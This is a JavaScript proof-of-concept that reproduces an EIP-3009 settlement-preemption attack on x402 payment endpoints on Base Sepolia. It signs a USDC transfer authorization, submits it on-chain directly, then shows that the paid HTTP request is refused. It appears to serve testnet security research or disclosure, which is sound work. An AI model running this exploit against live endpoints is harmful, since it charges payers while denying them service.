/**
 * Attack I-B: EIP-3009 settlement preemption on Base Sepolia.
 *
 * Set ALICE_PRIVATE_KEY to a disposable Base Sepolia test wallet and pass the
 * target endpoint with TARGET_URL. The script only logs public data.
 */

import { ethers } from "ethers";
import axios from "axios";

// Use the same EIP-712 types and ABI exposed by @x402/evm.
import { authorizationTypes, eip3009ABI } from "@x402/evm";

// Base Sepolia payer key. Use a disposable test wallet.
const ALICE_PRIVATE_KEY = "0x<PASTE_64_HEX_BASE_SEPOLIA_TEST_KEY_HERE>";

// Endpoint under test, for example:
//   TARGET_URL="https://<your-x402-endpoint>/..." npm run attack1b:eip3009
const TARGET_URL = process.env.TARGET_URL;
if (!TARGET_URL) {
  console.error(
    "ERROR: set TARGET_URL to a live x402 endpoint, e.g.\n" +
      "  export TARGET_URL=\"https://<your-x402-endpoint>/...\""
  );
  process.exit(1);
}

const RPC_URL = "https://sepolia.base.org";
const CHAIN_ID = 84532;
const USDC_ADDRESS = "0x036CbD53842c5426634e7929541eC2318f3dCF7e"; // Base Sepolia USDC
const EXPLORER_BASE = "https://sepolia.basescan.org";

function requirePrivateKey() {
  if (!/^0x[0-9a-fA-F]{64}$/.test(ALICE_PRIVATE_KEY)) {
    console.error(
      "ERROR: ALICE_PRIVATE_KEY placeholder not replaced.\n" +
        "Open this file and set ALICE_PRIVATE_KEY to a Base Sepolia test key\n" +
        "(0x followed by 64 hex characters)."
    );
    process.exit(1);
  }
  return ALICE_PRIVATE_KEY;
}

function shortAddr(a) {
  return `${a.slice(0, 6)}...${a.slice(-4)}`;
}

function log(label, msg) {
  const ts = new Date().toISOString().slice(11, 23);
  console.log(`[${ts}] [${label.padEnd(7)}] ${msg}`);
}

function section(title) {
  console.log(`\n${"=".repeat(76)}`);
  console.log(`  ${title}`);
  console.log(`${"=".repeat(76)}\n`);
}

function parsePaymentRequired(b64) {
  const json = Buffer.from(b64, "base64").toString("utf8");
  return JSON.parse(json);
}

async function main() {
  const ALICE_PK = requirePrivateKey();

  section("EIP-3009 settlement preemption");
  log("INFO", `Target endpoint : ${TARGET_URL}`);
  log("INFO", `Chain ID        : ${CHAIN_ID} (Base Sepolia)`);
  log("INFO", `Asset           : ${USDC_ADDRESS} (Base Sepolia USDC)`);
  log("INFO", "Signature types : import { authorizationTypes } from '@x402/evm'");
  log("INFO", "Settlement ABI  : import { eip3009ABI } from '@x402/evm'");

  const provider = new ethers.JsonRpcProvider(RPC_URL);
  const alice = new ethers.Wallet(ALICE_PK, provider);
  // Use a fresh caller wallet for the direct settlement transaction.
  const caller = new ethers.Wallet(ethers.Wallet.createRandom().privateKey, provider);

  const usdc = new ethers.Contract(USDC_ADDRESS, eip3009ABI, provider);

  log("INFO", `Alice address   : ${alice.address}`);
  log("INFO", `Caller address  : ${caller.address}`);

  section("Payment requirements");

  let initialResp;
  try {
    initialResp = await axios.get(TARGET_URL, {
      validateStatus: () => true,
      timeout: 30000,
    });
  } catch (err) {
    console.error("Failed to fetch target URL:", err.message);
    process.exit(1);
  }

  log("HTTP", `GET ${TARGET_URL}`);
  log("HTTP", `Status          : ${initialResp.status}`);

  const paymentRequiredB64 = initialResp.headers["payment-required"];
  if (!paymentRequiredB64) {
    console.error(
      "Target did not return a 'payment-required' header. Is the URL a live x402 endpoint?"
    );
    process.exit(1);
  }

  const pr = parsePaymentRequired(paymentRequiredB64);
  const accept = pr.accepts.find(
    (a) => a.scheme === "exact" && a.extra?.name === "USDC" && a.asset
  );
  if (!accept) {
    console.error("Target does not advertise an EIP-3009 USDC accept entry.");
    process.exit(1);
  }

  log("PR", `scheme          : ${accept.scheme}`);
  log("PR", `network         : ${accept.network}`);
  log("PR", `asset           : ${accept.asset}`);
  log("PR", `payTo           : ${accept.payTo}`);
  log("PR", `amount          : ${accept.amount} units (${ethers.formatUnits(accept.amount, 6)} USDC)`);
  log("PR", `extra.name/ver  : ${accept.extra?.name} / ${accept.extra?.version}`);

  const AMOUNT = accept.amount;
  const PAY_TO = ethers.getAddress(accept.payTo);
  const ASSET = ethers.getAddress(accept.asset);

  if (ASSET.toLowerCase() !== USDC_ADDRESS.toLowerCase()) {
    console.error(`Unexpected asset address: ${ASSET} vs ${USDC_ADDRESS}`);
    process.exit(1);
  }

  section("Prerequisites");

  const [aliceEth, callerEth, aliceUsdc] = await Promise.all([
    provider.getBalance(alice.address),
    provider.getBalance(caller.address),
    usdc.balanceOf(alice.address),
  ]);

  log("SETUP", `Alice ETH       : ${ethers.formatEther(aliceEth)}`);
  log("SETUP", `Caller ETH      : ${ethers.formatEther(callerEth)}`);
  log("SETUP", `Alice USDC      : ${ethers.formatUnits(aliceUsdc, 6)}`);

  if (aliceEth < ethers.parseEther("0.0005")) {
    console.error(
      "ERROR: Alice needs Base Sepolia ETH. Fund her at https://www.alchemy.com/faucets/base-sepolia"
    );
    process.exit(1);
  }
  if (aliceUsdc < BigInt(AMOUNT)) {
    console.error(
      `ERROR: Alice needs at least ${ethers.formatUnits(AMOUNT, 6)} Base Sepolia USDC. Get from https://faucet.circle.com/`
    );
    process.exit(1);
  }
  if (callerEth < ethers.parseEther("0.0005")) {
    log("SETUP", "Funding caller with 0.001 ETH for gas");
    const fundTx = await alice.sendTransaction({
      to: caller.address,
      value: ethers.parseEther("0.001"),
    });
    await fundTx.wait();
    const callerEthAfter = await provider.getBalance(caller.address);
    log("SETUP", `Caller fund tx  : ${EXPLORER_BASE}/tx/${fundTx.hash}`);
    log("SETUP", `Caller ETH now  : ${ethers.formatEther(callerEthAfter)}`);
  }

  section("Balances before");
  const aliceBalBefore = await usdc.balanceOf(alice.address);
  const payToBalBefore = await usdc.balanceOf(PAY_TO);
  log("BEFORE", `Alice   (${shortAddr(alice.address)}) USDC: ${ethers.formatUnits(aliceBalBefore, 6)}`);
  log("BEFORE", `PayTo   (${shortAddr(PAY_TO)}) USDC: ${ethers.formatUnits(payToBalBefore, 6)}`);

  section("Sign authorization");

  const nonce = ethers.hexlify(ethers.randomBytes(32));
  const validAfter = 0;
  const validBefore = Math.floor(Date.now() / 1000) + 300; // 5 minutes

  const domain = {
    name: accept.extra.name,       // "USDC"
    version: accept.extra.version, // "2"
    chainId: CHAIN_ID,
    verifyingContract: USDC_ADDRESS,
  };

  const message = {
    from: alice.address,
    to: PAY_TO,
    value: BigInt(AMOUNT),
    validAfter,
    validBefore,
    nonce,
  };

  const signature = await alice.signTypedData(domain, authorizationTypes, message);

  log("SIGN", `nonce (bytes32) : ${nonce}`);
  log("SIGN", `from            : ${alice.address}`);
  log("SIGN", `to (merchant)   : ${PAY_TO}`);
  log("SIGN", `value           : ${AMOUNT} (${ethers.formatUnits(AMOUNT, 6)} USDC)`);
  log("SIGN", `validAfter      : ${validAfter}`);
  log("SIGN", `validBefore     : ${validBefore} (${new Date(validBefore * 1000).toISOString()})`);
  log("SIGN", `signature       : ${signature.slice(0, 20)}...${signature.slice(-8)}`);

  // This is the x402 v2 payload used in the X-PAYMENT header.
  const paymentPayload = {
    x402Version: 2,
    accepted: accept,
    payload: {
      signature,
      authorization: {
        from: alice.address,
        to: PAY_TO,
        value: AMOUNT,
        validAfter: String(validAfter),
        validBefore: String(validBefore),
        nonce,
      },
    },
  };
  const encodedPayment = Buffer.from(JSON.stringify(paymentPayload)).toString("base64");
  log("SIGN", `X-PAYMENT (b64, first 60): ${encodedPayment.slice(0, 60)}...`);

  section("Submit authorization directly");

  log("SETTLE", "Submitting the signed authorization from the caller wallet.");

  const usdcCaller = new ethers.Contract(USDC_ADDRESS, eip3009ABI, caller);
  const { r, s, v } = ethers.Signature.from(signature);

  let attackTxHash = null;
  let attackBlock = null;
  let attackSuccess = false;
  let attackGasUsed = null;

  try {
    log("SETTLE", "Calling USDC.transferWithAuthorization(...)");
    const attackTx = await usdcCaller["transferWithAuthorization(address,address,uint256,uint256,uint256,bytes32,uint8,bytes32,bytes32)"](
      alice.address,
      PAY_TO,
      BigInt(AMOUNT),
      validAfter,
      validBefore,
      nonce,
      v,
      r,
      s
    );
    attackTxHash = attackTx.hash;
    log("SETTLE", `tx submitted    : ${EXPLORER_BASE}/tx/${attackTxHash}`);
    const receipt = await attackTx.wait();
    attackBlock = receipt.blockNumber;
    attackGasUsed = receipt.gasUsed.toString();
    attackSuccess = receipt.status === 1;
    log("SETTLE", `tx confirmed    : block ${attackBlock}, gas ${attackGasUsed}, status ${receipt.status}`);
  } catch (err) {
    log("SETTLE", `FAILED          : ${err.shortMessage || err.message}`);
  }

  let authUsed = null;
  try {
    authUsed = await usdc.authorizationState(alice.address, nonce);
    log("SETTLE", `authorizationState(Alice, nonce): ${authUsed}`);
  } catch (_) {}

  section("Balances after");
  const aliceBalAfter = await usdc.balanceOf(alice.address);
  const payToBalAfter = await usdc.balanceOf(PAY_TO);
  log("AFTER", `Alice   (${shortAddr(alice.address)}) USDC: ${ethers.formatUnits(aliceBalAfter, 6)}`);
  log("AFTER", `PayTo   (${shortAddr(PAY_TO)}) USDC: ${ethers.formatUnits(payToBalAfter, 6)}`);

  const aliceLoss = aliceBalBefore - aliceBalAfter;
  const payToGain = payToBalAfter - payToBalBefore;
  log("DELTA", `Alice lost      : ${ethers.formatUnits(aliceLoss, 6)} USDC`);
  log("DELTA", `PayTo gained    : ${ethers.formatUnits(payToGain, 6)} USDC`);

  section("Retry paid request");

  log("HTTP", "Retrying the endpoint with the same X-PAYMENT header.");

  let retryResp;
  try {
    retryResp = await axios.get(TARGET_URL, {
      headers: { "x-payment": encodedPayment },
      validateStatus: () => true,
      timeout: 60000,
    });
  } catch (err) {
    log("HTTP", `Request failed  : ${err.message}`);
  }

  const statusCode = retryResp?.status ?? null;
  const bodyPreview =
    typeof retryResp?.data === "string"
      ? retryResp.data.slice(0, 200)
      : JSON.stringify(retryResp?.data || {}).slice(0, 200);
  const respHeaders = retryResp?.headers || {};
  const respPaymentHeader =
    respHeaders["payment-response"] ||
    respHeaders["x-payment-response"] ||
    respHeaders["payment-required"];

  log("HTTP", `Status code     : ${statusCode}`);
  log("HTTP", `Response body   : ${bodyPreview}${bodyPreview.length >= 200 ? "..." : ""}`);
  if (respPaymentHeader) {
    try {
      const decoded = Buffer.from(respPaymentHeader, "base64").toString("utf8");
      log("HTTP", `Payment header  : ${decoded.slice(0, 200)}${decoded.length >= 200 ? "..." : ""}`);
    } catch (_) {
      log("HTTP", `Payment header  : ${respPaymentHeader.slice(0, 200)}`);
    }
  }

  section("Result");

  const aliceCharged = aliceLoss > 0n;
  const serverDenied = statusCode === 402;
  const nonceConsumed = authUsed === true;
  const e2eVulnerable = aliceCharged && nonceConsumed && serverDenied;

  if (e2eVulnerable) {
    console.log("  [OBSERVED] EIP-3009 preemption reproduced\n");
    console.log(`    On-chain effect:`);
    console.log(`      - Alice charged       : ${ethers.formatUnits(aliceLoss, 6)} USDC`);
    console.log(`      - Merchant (PayTo)    : received ${ethers.formatUnits(payToGain, 6)} USDC`);
    console.log(`      - USDC nonce consumed : yes (authorizationState == true)`);
    console.log(`      - Settlement tx       : ${EXPLORER_BASE}/tx/${attackTxHash}`);
    console.log(`      - Block               : ${attackBlock}`);
    console.log(`    HTTP effect:`);
    console.log(`      - Alice retried with X-PAYMENT`);
    console.log(`      - Server returned     : HTTP ${statusCode} (payment required)`);
    console.log(`      - Outcome             : paid request denied`);
  } else if (aliceCharged && nonceConsumed && !serverDenied) {
    console.log("  [PARTIAL] On-chain charge succeeded, but server returned " + statusCode);
    console.log("  The endpoint did not deny the retried request in this run.");
  } else {
    console.log("  [NO OBSERVATION] condition not reproduced in this run");
    console.log(`    aliceCharged=${aliceCharged} nonceConsumed=${nonceConsumed} serverDenied=${serverDenied} statusCode=${statusCode}`);
  }

  console.log("");
}

main().catch((err) => {
  console.error("Fatal error:", err);
  process.exit(1);
});
